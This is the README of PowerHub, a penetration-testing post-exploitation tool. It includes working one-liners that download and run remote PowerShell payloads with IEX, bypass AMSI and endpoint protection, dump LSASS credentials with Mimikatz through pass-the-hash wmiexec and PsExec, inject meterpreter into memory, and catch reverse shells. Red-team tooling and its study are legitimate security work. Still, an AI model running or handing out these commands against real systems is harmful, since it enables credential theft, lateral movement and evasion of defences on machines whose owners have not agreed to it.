PowerHub
========

PowerHub is a convenient post exploitation tool which aids a pentester in
transferring files, in particular code which may get flagged by endpoint
protection.

![PowerHub Webapp](https://github.com/AdrianVollmer/PowerHub/blob/master/img/powerhub-webapp.png)

During an engagement where you have a test client available, one of the
first things you want to do is run PowerSploit. So you need to download the
files, messing with endpoint protection, disable the execution policy, etc.
PowerHub provides an (almost) one-click-solution for this. Oh, and you can
also run arbitrary binaries (PE and shell code) entirely in-memory using
PowerSploit's modules, which is sometimes useful to bypass application
whitelisting.

Your loot (Kerberos tickets, passwords, etc.) can be easily transferred back
either as a file or a text snippet, via the command line or the web
interface. PowerHub also helps with collaboration in case you're a small
team.

On top of that, PowerHub comes with a powerful reverse PowerShell, making
it suitable for any kind of post-exploitation action.

Here is a simple example (grab information about local groups with PowerView
and transfer it back):

```
PS C:\Users\avollmer> $K=new-object net.webclient;$K.proxy=[Net.WebRequest]::GetSystemWebProxy();$K.Proxy.Credent
ials=[Net.CredentialCache]::DefaultCredentials;IEX $K.downloadstring('http://192.168.11.2:8000/0');
  _____   _____  _  _  _ _______  ______ _     _ _     _ ______
 |_____] |     | |  |  | |______ |_____/ |_____| |     | |_____]
 |       |_____| |__|__| |______ |    \_ |     | |_____| |_____]
                            written by Adrian Vollmer, 2018-2019
Run 'Help-PowerHub' for help
AmsiScanBuffer patch has been applied.
0
PS C:\Users\avollmer> lhm powerview
[*] /ps1/PowerSploit/Recon/PowerView.ps1 imported.
PS C:\Users\avollmer> Get-LocalGroup | ConvertTo-Json | Out-file groups.json
PS C:\Users\avollmer> pth groups.json
```

![PowerHub in action](https://github.com/AdrianVollmer/PowerHub/blob/master/img/inaction.png)

How it works
============

The web application is made with Flask and consists of four parts.

The Hub
-------

The hub uses PowerShell to load modules and binaries in memory. The binaries
can be executed directly from memory with
[PowerSploit's](https://github.com/PowerShellMafia/PowerSploit)
`Invoke-ReflectivePEInjection`.

Modules have to be placed in `./modules` and can be either PowerShell
scripts, .NET or PE executables, or shell code. You can load them on the
target via PowerShell with `Load-HubModule`. Run `Help-PowerHub` for more
information.

PowerHub on the attacker system simply looks for `*.ps1` or `*.exe` files.
They need to be in their respective directory, though, so `exe` files need
to be in `modules/exe` (or at least symlinked), and so forth. The `*.ps1`
files are imported on the target via `[Scriptblock]::Create()`.

A simple interface to install modules is provided for your convenience.

The Receiver
------------

*EXPERIMENTAL*

The receiver catches incoming reverse shells and lists them here. Each shell
receives a random ID consisting of an eight digit hex string. You can
interact with it by executing the accompanying script: `./ph <ID>`.

This lands you inside a PowerShell instance. It's a _nice_ shell, too: It
supports colors, a history, tab completion, vim/emacs edit modes, it
respects your terminal's column count and accidentally pressing CTRL+C is
not a big deal - simply reconnect to it. Run `./ph -h` for more information.

The Clipboard
-------------

The clipboard functionality is meant for exchanging small snippets, such as
hashes, passwords, one-liners, and so forth. It's like an extremely basic
[Etherpad](https://etherpad.org/) or a guest book.

The File Exchange
-----------------

The file exchange offers a way to transfer files via HTTP back to the host.
Think [Droopy](https://github.com/stackp/Droopy).

If you have the necessary Python modules installed, a WebDAV service is also
started. You can mount it on the target as two network drives with
`Mount-WebDAV` (as 'S:' by default). Be careful, it allows anonmyous access.
One drive is read-only -- maybe you can bypass a weak anti virus with this.
The other has two folders and writeable by everyone:

* `public` with read/write access for everyone
* `blackhole` for dropping sensitive data. Any file placed here via WebDAV
  will immediately be moved to the `upload` directory in `$XDG_DATA_HOME`.

The dependencies for the WebDAV service are `wsgidav` (installable via
`pip3`), `cheroot` and `watchdog`.

Usage
=====

PowerHub has one mandatory arguments: the callback host (can be an IP
address). You should also use `--auth <user>:<pass>`, otherwise, a randomly
generated password will be used for basic authentication. The switch
`--no-auth` disables basic authentication which is *not recommended*. The
callback host name is used by the stager to download the payload. If the
callback port or path differ from the default, it can also be changed.

Read `./powerhub.py --help` for details.

Examples
========

One nice application is, for example, the case where you have obtained some
local administrator password hash and want to move laterally. This dumps the
LSASS creds with Mimikatz via Impacket's `wmiexec.py`, tricking many
endpoint protection tools:

```
wmiexec.py -hashes :deadbeef0000000000000000deadbeef \
    ./administrator@10.0.1.4  \
    'powershell -c "$K=new-object net.webclient;IEX $K.downloadstring(\"http://10.0.100.13:8000/0\"); Load-Hubmodule Mimikatz ; Invoke-Mimikatz -DumpCreds "'
```

Or similarly, if you obtained the `krbtgt` hash and created a golden ticket
which you injected with Mimikatz. Then you can get the NTLM hash of any
arbitrary user in the forest:

```
PS C:\Users\pentestuser> .\PsExec64.exe \\DC01.acme.local -s powershell -c '$K=new-object net.webclient;IEX $K.downloadstring(\"http://192.168.1.5:8000/0\");load-hubmodule mimikatz; Invoke-Mimikatz -Command ''\"lsadump::lsa /inject /name:adm_targetuser\"'''
```

Getting the escape sequence on the quotes right can be tough...

Let's say you want to execute a meterpreter in memory, then you do this:

```
PS C:\Users\pentestuser> lhm ReflectivePEInjection; lhm meterpreter.exe|re
```

Credits
=======

PowerHub is based on the awesome work of zeroc00l, mar10, p3nt4. Thanks!

Author
======

Adrian Vollmer, 2018-2019

Disclaimer
==========

Use at your own risk. Do not use without full consent of everyone involved.
For educational purposes only.
